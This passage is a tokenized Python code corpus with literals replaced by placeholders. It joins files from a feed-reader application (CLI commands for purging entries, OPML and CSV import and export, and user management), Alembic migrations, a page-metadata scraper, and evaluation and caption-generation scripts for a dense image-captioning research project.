func . count ( models . Feed . entries ) > <NUM_LIT> ) <EOL> for ( feed_id , feed_name ) in db . session . execute ( feeds_q ) . all ( ) : <EOL> min_sort_date = db . session . scalar ( <EOL> db . select ( models . Entry . sort_date ) <EOL> . filter_by ( feed_id = feed_id ) <EOL> . order_by ( models . Entry . sort_date . desc ( ) ) <EOL> . limit ( <NUM_LIT> ) <EOL> . offset ( minimum - <NUM_LIT> ) ) <EOL> if not min_sort_date : <EOL> continue <EOL> q = db . delete ( models . Entry ) . where ( <EOL> models . Entry . favorited . is_ ( None ) , <EOL> models . Entry . backlogged . is_ ( None ) , <EOL> models . Entry . pinned . is_ ( None ) , <EOL> models . Entry . feed_id == feed_id , <EOL> models . Entry . sort_date < min_sort_date , <EOL> models . Entry . sort_date < older_than_date ) <EOL> res = db . session . execute ( q ) <EOL> db . session . commit ( ) <EOL> if res . rowcount : <EOL> app . logger . info ( "<STR_LIT>" , res . rowcount , feed_id , feed_name ) <EOL> q = db . delete ( models . Entry ) . where ( <EOL> models . Entry . feed_id . is_ ( None ) , <EOL> models . Entry . favorited . is_ ( None ) , <EOL> models . Entry . pinned . is_ ( None ) , <EOL> models . Entry . sort_date < older_than_date ) <EOL> res = db . session . execute ( q ) <EOL> db . session . commit ( ) <EOL> if res . rowcount : <EOL> app . logger . info ( "<STR_LIT>" , res . rowcount ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ huey_task ( crontab ( minute = '<STR_LIT>' , hour = '<STR_LIT>' ) ) <EOL> def pop_backlog ( ) : <EOL> "<STR_LIT>" <EOL> week_ago = datetime . datetime . utcnow ( ) - datetime . timedelta ( days = <NUM_LIT> ) <EOL> backlogged_date = sa . func . min ( models . Entry . backlogged ) . label ( '<STR_LIT>' ) <EOL> query = db . select ( models . Entry ) . group_by ( models . Entry . user_id ) . having ( backlogged_date < week_ago ) <EOL> for entry in db . session . scalars ( query ) : <EOL> entry . unbacklog ( ) <EOL> app . logger . info ( "<STR_LIT>" , entry . user_id , entry . target_url ) <EOL> db . session . commit ( ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( '<STR_LIT>' ) <EOL> def debug_feed ( url ) : <EOL> parsers . rss . pretty_print ( url ) <EOL> def load_user_arg ( _ctx , _param , email ) : <EOL> if not email : <EOL> email = app . config . get ( '<STR_LIT>' ) <EOL> if not email : <EOL> raise click . UsageError ( '<STR_LIT>' ) <EOL> user = db . session . scalar ( db . select ( models . User ) . filter_by ( email = email ) ) <EOL> if not user : <EOL> raise click . UsageError ( f'<STR_LIT>' ) <EOL> return user <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( "<STR_LIT>" ) <EOL> @ click . argument ( '<STR_LIT>' , required = False , callback = load_user_arg ) <EOL> def csv_load ( file , user ) : <EOL> "<STR_LIT>" <EOL> with open ( file ) as csv_file : <EOL> for values in csv . reader ( csv_file ) : <EOL> cls = models . Feed . resolve ( values [ <NUM_LIT> ] ) <EOL> feed = cls . from_valuelist ( * values ) <EOL> feed . user_id = user . id <EOL> add_if_not_exists ( feed ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( "<STR_LIT>" ) <EOL> @ click . argument ( '<STR_LIT>' , required = False , callback = load_user_arg ) <EOL> def csv_dump ( file , user ) : <EOL> "<STR_LIT>" <EOL> with open ( file , '<STR_LIT>' ) as csv_file : <EOL> feed_writer = csv . writer ( csv_file ) <EOL> for feed in db . session . execute ( db . select ( models . Feed ) <EOL> . filter_by ( user_id = user . id , is_mastodon = False ) ) . scalars ( ) : <EOL> feed_writer . writerow ( feed . to_valuelist ( ) ) <EOL> app . logger . info ( '<STR_LIT>' , feed ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( "<STR_LIT>" ) <EOL> @ click . argument ( '<STR_LIT>' , required = False , callback = load_user_arg ) <EOL> def opml_load ( file , user ) : <EOL> document = opml . OpmlDocument . load ( file ) <EOL> for outline in document . outlines : <EOL> if outline . outlines : <EOL> folder = outline . text <EOL> for feed in outline . outlines : <EOL> add_if_not_exists ( models . RssFeed ( name = feed . title or feed . text , <EOL> user_id = user . id , <EOL> url = feed . xml_url , <EOL> folder = folder ) ) <EOL> else : <EOL> add_if_not_exists ( models . RssFeed ( name = feed . title or feed . text , <EOL> user_id = user . id , <EOL> url = feed . xml_url ) ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( "<STR_LIT>" ) <EOL> @ click . argument ( '<STR_LIT>' , required = False , callback = load_user_arg ) <EOL> def opml_dump ( file , user ) : <EOL> document = opml . OpmlDocument ( ) <EOL> folder_outlines = { } <EOL> for feed in db . session . execute ( db . select ( models . RssFeed ) <EOL> . filter_by ( user_id = user . id ) <EOL> ) . scalars ( ) : <EOL> if feed . folder : <EOL> if feed . folder in folder_outlines : <EOL> folder_outlines [ feed . folder ] = document . add_outline ( feed . folder ) <EOL> target = folder_outlines [ feed . folder ] <EOL> else : <EOL> target = document <EOL> target . add_rss ( feed . name , <EOL> feed . url , <EOL> title = feed . name , <EOL> categories = [ feed . folder ] if feed . folder else [ ] , <EOL> created = datetime . datetime . now ( ) ) <EOL> document . dump ( file ) <EOL> def add_if_not_exists ( feed ) : <EOL> query = db . select ( db . exists ( models . Feed ) <EOL> . where ( models . Feed . name == feed . name , models . Feed . user_id == feed . user_id ) ) <EOL> if db . session . execute ( query ) . scalar ( ) : <EOL> app . logger . info ( '<STR_LIT>' , feed . name ) <EOL> return <EOL> db . session . add ( feed ) <EOL> db . session . commit ( ) <EOL> feed . load_icon ( ) <EOL> db . session . commit ( ) <EOL> app . logger . info ( '<STR_LIT>' , feed ) <EOL> @ user_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( '<STR_LIT>' ) <EOL> @ click . password_option ( ) <EOL> def user_add ( email , password ) : <EOL> user = models . User ( email = email ) <EOL> user . set_password ( password ) <EOL> db . session . add ( user ) <EOL> db . session . commit ( ) <EOL> @ user_cli . command ( '<STR_LIT>' ) <EOL> @ click . argument ( '<STR_LIT>' ) <EOL> def user_delete ( email ) : <EOL> stmt = db . delete ( models . User ) . where ( models . User . email == email ) <EOL> db . session . execute ( stmt ) <EOL> db . session . commit ( ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> pass <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> pass <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = True ) ) <EOL> batch_op . create_foreign_key ( '<STR_LIT>' , '<STR_LIT>' , [ <EOL> '<STR_LIT>' ] , [ '<STR_LIT>' ] ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . VARCHAR ( ) , nullable = True ) ) <EOL> batch_op . drop_constraint ( '<STR_LIT>' , type_ = '<STR_LIT>' ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . String ( ) , nullable = True ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> import datetime <EOL> import json <EOL> import dateparser <EOL> from bs4 import BeautifulSoup <EOL> from feedi import scraping <EOL> from feedi . requests import requests <EOL> def fetch ( url ) : <EOL> response = requests . get ( url ) <EOL> response . raise_for_status ( ) <EOL> if not response . ok : <EOL> raise Exception ( ) <EOL> soup = BeautifulSoup ( response . content , '<STR_LIT>' ) <EOL> metadata = scraping . all_meta ( soup ) <EOL> title = metadata . get ( '<STR_LIT>' , metadata . get ( '<STR_LIT>' , getattr ( soup . title , '<STR_LIT>' ) ) ) <EOL> if not title : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> if '<STR_LIT>' in metadata : <EOL> display_date = dateparser . parse ( metadata [ '<STR_LIT>' ] ) <EOL> else : <EOL> display_date = datetime . datetime . utcnow ( ) <EOL> username = metadata . get ( '<STR_LIT>' , '<STR_LIT>' ) . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> icon_url = scraping . get_favicon ( url , html = response . content ) <EOL> entry = { <EOL> '<STR_LIT>' : url , <EOL> '<STR_LIT>' : title , <EOL> '<STR_LIT>' : username , <EOL> '<STR_LIT>' : display_date , <EOL> '<STR_LIT>' : datetime . datetime . utcnow ( ) , <EOL> '<STR_LIT>' : metadata . get ( '<STR_LIT>' , metadata . get ( '<STR_LIT>' ) ) , <EOL> '<STR_LIT>' : metadata . get ( '<STR_LIT>' , metadata . get ( '<STR_LIT>' ) ) , <EOL> '<STR_LIT>' : url , <EOL> '<STR_LIT>' : url , <EOL> '<STR_LIT>' : json . dumps ( metadata ) , <EOL> '<STR_LIT>' : icon_url } <EOL> return entry <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True ) ) <EOL> batch_op . create_index ( batch_op . f ( '<STR_LIT>' ) , [ '<STR_LIT>' ] , unique = False ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_index ( batch_op . f ( '<STR_LIT>' ) ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> import parse <EOL> import os <EOL> FORMAT_STRING = <EOL> def extract_numbers ( fpath ) : <EOL> with open ( fpath ) as f : <EOL> dat = f . read ( ) <EOL> parsed = parse . parse ( FORMAT_STRING , dat ) <EOL> mn = parsed [ <NUM_LIT> ] <EOL> vgr = parsed [ <NUM_LIT> ] <EOL> vga = parsed [ <NUM_LIT> ] <EOL> coco = parsed [ <NUM_LIT> ] <EOL> flickr = parsed [ <NUM_LIT> ] <EOL> vlco = parsed [ <NUM_LIT> ] <EOL> vlca = parsed [ <NUM_LIT> ] <EOL> vlcr = parsed [ <NUM_LIT> ] <EOL> wgt = parsed [ <NUM_LIT> ] <EOL> wgi = parsed [ <NUM_LIT> ] <EOL> wgg = parsed [ <NUM_LIT> ] <EOL> dcas = parsed [ <NUM_LIT> ] <EOL> dcasn = parsed [ <NUM_LIT> ] <EOL> dcp5 = parsed [ <NUM_LIT> ] <EOL> dcp5n = parsed [ <NUM_LIT> ] <EOL> dcbn = parsed [ <NUM_LIT> ] <EOL> dch = parsed [ <NUM_LIT> ] <EOL> dchn = parsed [ <NUM_LIT> ] <EOL> print ( f"<STR_LIT>" ) <EOL> def print_all_scores ( ) : <EOL> evals_dir = input ( "<STR_LIT>" ) <EOL> for subdir in os . listdir ( evals_dir ) : <EOL> outpath = os . path . join ( evals_dir , subdir ) <EOL> outfile = os . path . join ( outpath , [ n for n in os . listdir ( outpath ) if "<STR_LIT>" in n ] [ <NUM_LIT> ] ) <EOL> extract_numbers ( outfile ) <EOL> if __name__ == '<STR_LIT>' : <EOL> print_all_scores ( ) <EOL> </s>
<s> from densely_captioned_images . repro . eval . ARO . dataset_zoo import VG_Relation , VG_Attribution , COCO_Order <EOL> from densely_captioned_images . repro . config import COCO_DIR , ARO_DIR <EOL> import os <EOL> def run_downloads ( ) : <EOL> if not os . path . exists ( ARO_DIR ) : <EOL> os . makedirs ( ARO_DIR , exist_ok = True ) <EOL> _ = VG_Relation ( image_preprocess = lambda x : x , download = True , root_dir = ARO_DIR ) <EOL> _ = VG_Attribution ( image_preprocess = lambda x : x , download = True , root_dir = ARO_DIR ) <EOL> if not os . path . exists ( COCO_DIR ) : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> _ = COCO_Order ( image_preprocess = lambda x : x , download = True , root_dir = COCO_DIR ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_downloads ( ) <EOL> </s>
<s> import os <EOL> import json <EOL> from long_captions . prepare . remote_language_model import RemoteLanguageModel <EOL> from long_captions . dense_image import DenseCaptionedImage , get_key_for , get_dci_count <EOL> from long_captions . config import DATASET_COMPLETE_PATH <EOL> import threading <EOL> from queue import Queue <EOL> from typing import Tuple , Dict , List <EOL> NUM_THREADS = <NUM_LIT> <EOL> def get_new_summaries ( <EOL> rlm : RemoteLanguageModel , dci : DenseCaptionedImage , max_retry = <NUM_LIT> <EOL> ) -> Tuple [ Dict [ str , List [ str ] ] , bool , bool ] : <EOL> did_nothing = True <EOL> summaries = dci . get_summaries ( ) <EOL> while not isinstance ( summaries [ '<STR_LIT>' ] , list ) : <EOL> try : <EOL> summaries [ '<STR_LIT>' ] = [ summaries [ '<STR_LIT>' ] ] + rlm . get_new_captions_for_dci ( dci ) <EOL> did_nothing = False <EOL> except AssertionError : <EOL> max_retry -= <NUM_LIT> <EOL> if max_retry == <NUM_LIT> : <EOL> return summaries , did_nothing , False <EOL> all_masks = dci . filter_masks_by_size ( ) <EOL> for m in all_masks : <EOL> key = f'<STR_LIT>' <EOL> while not isinstance ( summaries [ key ] , list ) : <EOL> try : <EOL> summaries [ key ] = [ summaries [ key ] ] + rlm . get_new_captions_for_mask ( dci , m ) <EOL> did_nothing = False <EOL> except AssertionError : <EOL> max_retry -= <NUM_LIT> <EOL> if max_retry == <NUM_LIT> : <EOL> return summaries , did_nothing , False <EOL> return summaries , did_nothing , True <EOL> def thread_entry ( idx_pool : Queue , rlm ) : <EOL> while not idx_pool . empty ( ) : <EOL> i = idx_pool . get ( ) <EOL> if int ( i ) % <NUM_LIT> == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> dci = DenseCaptionedImage ( i ) <EOL> key = get_key_for ( i ) <EOL> source_path = os . path . join ( DATASET_COMPLETE_PATH , key ) <EOL> if not os . path . exists ( source_path ) : <EOL> continue <EOL> new_summaries , did_nothing , success = get_new_summaries ( rlm , dci ) <EOL> if did_nothing is True : <EOL> print ( "<STR_LIT>" , end = '<STR_LIT>' , flush = True ) <EOL> else : <EOL> with open ( source_path , '<STR_LIT>' ) as jsonf : <EOL> orig_data = json . load ( jsonf ) <EOL> orig_data [ '<STR_LIT>' ] = new_summaries <EOL> if success is False : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> with open ( source_path , '<STR_LIT>' ) as jsonf : <EOL> json . dump ( orig_data , jsonf ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> def run_gen_additional_summary ( ) : <EOL> rlm = RemoteLanguageModel ( '<STR_LIT>' ) <EOL> idx_pool = Queue ( ) <EOL> count = get_dci_count ( ) <EOL> for i in range ( count ) : <EOL> idx_pool . put ( i ) <EOL> thread_pool = [ ] <EOL> for _ in range ( NUM_THREADS ) : <EOL> t = threading . Thread ( target = thread_entry , args = ( idx_pool , rlm ) ) <EOL> t . start ( ) <EOL> thread_pool . append ( t ) <EOL> for thread in thread_pool : <EOL> thread . join ( ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_gen_additional_summary ( ) <EOL> </s>
<s> from long_captions . dense_image import DenseCaptionedImage , get_key_for <EOL> from long_captions . prepare . remote_language_model import RemoteLanguageModel <EOL> from long_captions . utils import get_clip_token_length <EOL> from long_captions . config import OUTPUT_SUMMARY_PATH , OUTPUT_NEGATIVE_PATH <EOL> import os <EOL> import json <EOL> import threading <EOL> from queue import Queue <EOL> from typing import Dict , Any , Optional , Tuple <EOL> IDX_TARGET = <NUM_LIT> <EOL> DEBUG = False <EOL> SKIP_EXISTING = False <EOL> NUM_THREADS = <NUM_LIT> <EOL> def get_n_negatives_per ( <EOL> input_caption : str , <EOL> rlm : RemoteLanguageModel , <EOL> n : int = <NUM_LIT> , <EOL> max_fails : int = <NUM_LIT> <EOL> ) : <EOL> if DEBUG : <EOL> print ( input_caption ) <EOL> res = { <EOL> '<STR_LIT>' : [ ] , <EOL> '<STR_LIT>' : [ ] , <EOL> '<STR_LIT>' : [ ] , <EOL> } <EOL> targets = list ( res . keys ( ) ) * n <EOL> failures = <NUM_LIT> <EOL> caption_tokens = get_clip_token_length ( input_caption ) <EOL> for target in targets : <EOL> added = False <EOL> while added is False : <EOL> try : <EOL> negative_caption = rlm . get_negative ( input_caption , target ) <EOL> if DEBUG : <EOL> print ( negative_caption ) <EOL> assert get_clip_token_length ( negative_caption ) > caption_tokens - <NUM_LIT> , "<STR_LIT>" <EOL> assert get_clip_token_length ( negative_caption ) < caption_tokens + <NUM_LIT> , "<STR_LIT>" <EOL> negative_caption_reduced = rlm . reduce_length ( negative_caption , target_tokens = caption_tokens + <NUM_LIT> ) <EOL> res [ target ] . append ( negative_caption_reduced ) <EOL> added = True <EOL> except Exception as e : <EOL> if DEBUG : <EOL> import traceback <EOL> traceback . print_exc ( ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> failures += <NUM_LIT> <EOL> if failures >= max_fails : <EOL> raise <EOL> if DEBUG : <EOL> print ( res ) <EOL> return res <EOL> def negatives_len_fit ( negs ) : <EOL> for subkeys in negs . values ( ) : <EOL> for generated_negative in subkeys : <EOL> if get_clip_token_length ( generated_negative ) > <NUM_LIT> : <EOL> return False <EOL> return True <EOL> def gen_negatives_for ( <EOL> idx : int , <EOL> rlm : RemoteLanguageModel , <EOL> n : int = <NUM_LIT> , <EOL> max_fails : int = <NUM_LIT> , <EOL> existing : Optional [ Dict [ str , Any ] ] = None <EOL> ) -> Tuple [ Optional [ Dict [ str , Any ] ] , bool , bool ] : <EOL> failures = <NUM_LIT> <EOL> dci = DenseCaptionedImage ( idx ) <EOL> had_edit = False <EOL> if existing is None : <EOL> negatives = { <EOL> '<STR_LIT>' : None , <EOL> } <EOL> else : <EOL> negatives = existing <EOL> key = get_key_for ( idx ) <EOL> summary_path = os . path . join ( OUTPUT_SUMMARY_PATH , key ) <EOL> with open ( summary_path ) as jsonf : <EOL> summaries = json . load ( jsonf ) <EOL> while negatives [ '<STR_LIT>' ] is None or not negatives_len_fit ( negatives [ '<STR_LIT>' ] ) : <EOL> try : <EOL> negatives [ '<STR_LIT>' ] = get_n_negatives_per ( summaries [ '<STR_LIT>' ] , rlm , n ) <EOL> had_edit = True <EOL> except Exception as e : <EOL> if DEBUG : <EOL> import traceback <EOL> traceback . print_exc ( ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> failures += <NUM_LIT> <EOL> if failures >= max_fails : <EOL> return negatives , had_edit , False <EOL> all_masks = dci . get_all_masks ( ) <EOL> for m in all_masks : <EOL> entry = dci . get_caption_with_subcaptions ( m ) [ <NUM_LIT> ] <EOL> key = entry [ '<STR_LIT>' ] <EOL> caption = entry [ '<STR_LIT>' ] <EOL> if key in negatives : <EOL> if negatives_len_fit ( negatives [ key ] ) : <EOL> continue <EOL> if key in summaries : <EOL> caption = summaries [ key ] <EOL> else : <EOL> continue <EOL> res = None <EOL> while res is None : <EOL> try : <EOL> res = get_n_negatives_per ( caption , rlm , <NUM_LIT> ) <EOL> negatives [ key ] = res <EOL> had_edit = True <EOL> except Exception as e : <EOL> if DEBUG : <EOL> import traceback <EOL> traceback . print_exc ( ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> failures += <NUM_LIT> <EOL> if failures >= max_fails : <EOL> return negatives , had_edit , False <EOL> return negatives , had_edit , True <EOL> def thread_entry ( idx_pool : Queue , rlm : RemoteLanguageModel ) : <EOL> while not idx_pool . empty ( ) : <EOL> i , existing = idx_pool . get ( ) <EOL> key = get_key_for ( i ) <EOL> if int ( i ) % <NUM_LIT> == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> target_path = os . path . join ( OUTPUT_NEGATIVE_PATH , key ) <EOL> negatives , edited , success = gen_negatives_for ( i , rlm , existing = existing ) <EOL> if edited : <EOL> with open ( target_path , '<STR_LIT>' ) as jsonf : <EOL> json . dump ( negatives , jsonf ) <EOL> if success is False : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> else : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' ) as neg_file : <EOL> neg_file . write ( target_path + "<STR_LIT>" ) <EOL> else : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> def run_gen_summary ( ) : <EOL> rlm = RemoteLanguageModel ( '<STR_LIT>' ) <EOL> idx_pool = Queue ( ) <EOL> for i in range ( IDX_TARGET ) : <EOL> key = get_key_for ( i ) <EOL> target_path = os . path . join ( OUTPUT_NEGATIVE_PATH , key ) <EOL> existing = None <EOL> if os . path . exists ( target_path ) : <EOL> if SKIP_EXISTING : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> else : <EOL> with open ( target_path ) as jsonf : <EOL> existing = json . load ( jsonf ) <EOL> summary_path = os . path . join ( OUTPUT_SUMMARY_PATH , key ) <EOL> if not os . path . exists ( summary_path ) : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> idx_pool . put ( ( i , existing ) ) <EOL> thread_pool = [ ] <EOL> for _ in range ( NUM_THREADS ) : <EOL> t = threading . Thread ( target = thread_entry , args = ( idx_pool , rlm ) ) <EOL> t . start ( ) <EOL> thread_pool . append ( t ) <EOL> for thread in thread_pool : <EOL> thread . join ( ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_gen_summary ( ) <EOL> </s>
<s> from densely_captioned_images . repro . eval . ARO . dataset_zoo import VG_Relation , VG_Attribution , COCO_Order , Flickr30k_Order <EOL> from densely_captioned_images . repro . eval . clip_aro_wrap import AROtoHFCLIPWrap <EOL> from densely_captioned_images . repro . config import ARO_DIR , COCO_DIR <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> from torch . utils . data import DataLoader <EOL> import pandas as pd <EOL> import nltk <EOL> try : <EOL> nltk . data . find ( '<STR_LIT>' ) <EOL> except LookupError : <EOL> nltk . download ( '<STR_LIT>' ) <EOL> def run_aro_evals ( model : CLIPModel , processor : CLIPProcessor ) : <EOL> vgr_dataset = VG_Relation ( image_preprocess = processor . image_processor , download = True , root_dir = ARO_DIR ) <EOL> vga_dataset = VG_Attribution ( image_preprocess = processor . image_processor , download = True , root_dir = ARO_DIR ) <EOL> coco_order_dataset = COCO_Order ( image_preprocess = processor . image_processor , download = True , root_dir = COCO_DIR ) <EOL> flickr_order_dataset = Flickr30k_Order ( image_preprocess = processor . image_processor , split = '<STR_LIT>' , root_dir = ARO_DIR ) <EOL> vgr_loader = DataLoader ( vgr_dataset , batch_size = <NUM_LIT> , shuffle = False ) <EOL> vga_loader = DataLoader ( vga_dataset , batch_size = <NUM_LIT> , shuffle = False ) <EOL> coco_loader = DataLoader ( coco_order_dataset , batch_size = <NUM_LIT> , shuffle = False ) <EOL> flickr_loader = DataLoader ( flickr_order_dataset , batch_size = <NUM_LIT> , shuffle = False ) <EOL> aro_wrap = AROtoHFCLIPWrap ( model , processor ) <EOL> vgr_scores = aro_wrap . get_retrieval_scores_batched ( vgr_loader ) <EOL> vgr_records = vgr_dataset . evaluate_scores ( vgr_scores ) <EOL> symmetric = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> df = pd . DataFrame ( vgr_records ) <EOL> df = df [ ~ df . Relation . isin ( symmetric ) ] <EOL> vgr_metric = df . Accuracy . mean ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> vga_scores = aro_wrap . get_retrieval_scores_batched ( vga_loader ) <EOL> vga_records = vga_dataset . evaluate_scores ( vga_scores ) <EOL> df = pd . DataFrame ( vga_records ) <EOL> vga_metric = df . Accuracy . mean ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> coco_scores = aro_wrap . get_retrieval_scores_batched ( coco_loader ) <EOL> coco_records = coco_order_dataset . evaluate_scores ( coco_scores ) <EOL> df = pd . DataFrame ( coco_records ) <EOL> coco_metric = df [ '<STR_LIT>' ] . mean ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> flickr_scores = aro_wrap . get_retrieval_scores_batched ( flickr_loader ) <EOL> flickr_records = flickr_order_dataset . evaluate_scores ( flickr_scores ) <EOL> df = pd . DataFrame ( flickr_records ) <EOL> flickr_metric = df [ '<STR_LIT>' ] . mean ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> return { <EOL> '<STR_LIT>' : vgr_metric , <EOL> '<STR_LIT>' : vga_metric , <EOL> '<STR_LIT>' : coco_metric , <EOL> '<STR_LIT>' : flickr_metric , <EOL> } <EOL> def run_aro_on_lora ( lora_weight_path ) : <EOL> from peft import PeftModel <EOL> processor = CLIPProcessor . from_pretrained ( 